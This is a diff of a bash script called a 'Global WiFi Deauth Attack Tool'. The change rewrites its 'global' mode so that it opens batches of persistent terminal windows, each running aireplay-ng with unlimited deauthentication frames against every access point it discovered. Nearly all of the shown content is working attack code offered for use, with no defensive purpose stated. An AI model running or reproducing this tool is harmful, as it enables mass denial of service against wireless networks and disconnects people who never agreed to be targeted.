@@ -1,6 +1,5 @@
 #!/bin/bash
 # Global WiFi Deauth Attack Tool by rff-glitch (Raef)
-# Combines all attack modes: single AP, global attack, and specific device targeting
 
 # Root access check
 if [[ $EUID -ne 0 ]]; then 
@@ -184,15 +183,33 @@ launch_attack() {
     
     case "$attack_type" in
         "global")
-            for ap in "${targets[@]}"; do
-                IFS='|' read -r bssid channel essid <<< "$ap"
-                iw dev "$iface" set channel "$channel"
-                for i in {1..3}; do
-                    xterm -geometry 100x15 -bg black -fg red -T "ATTACKING $essid" \
-                        -e "while true; do aireplay-ng --ignore-negative-one --deauth 10 -a $bssid $iface; sleep 1; done" &
-                    sleep 0.2
+                total=${#targets[@]}
+                batch_size=6
+
+                echo -e "${YELLOW}🚨 Launching persistent attacks on $total APs, $batch_size at a time...${RESET}"
+
+                for ((i=0; i<total; i++)); do
+                  # Extract AP info
+                 ap="${targets[i]}"
+                 IFS='|' read -r bssid channel essid <<< "$ap"
+
+                  # Spawn persistent xterm per AP
+                 xterm -geometry 100x15 -bg black -fg red -T "🔥 $essid" -e bash -c "
+                 while true; do
+                   echo '[⚔] Locking $essid ($bssid) on CH $channel'
+                   iw dev \"$iface\" set channel \"$channel\"
+                   aireplay-ng --ignore-negative-one --deauth 0 -a \"$bssid\" \"$iface\"
+                   sleep 0.5
+                 done
+                 " &
+
+                  # Limit concurrency
+                 if (( (i + 1) % batch_size == 0 )); then
+                    wait
+                 fi
+
+                 sleep 0.2  
                 done
-            done
             ;;
         "single")
             IFS='|' read -r bssid channel essid <<< "${targets[0]}"
@@ -291,3 +308,4 @@ case "$attack_mode" in
         cleanup
         ;;
 esac
+#rff-glitch ( Raef )
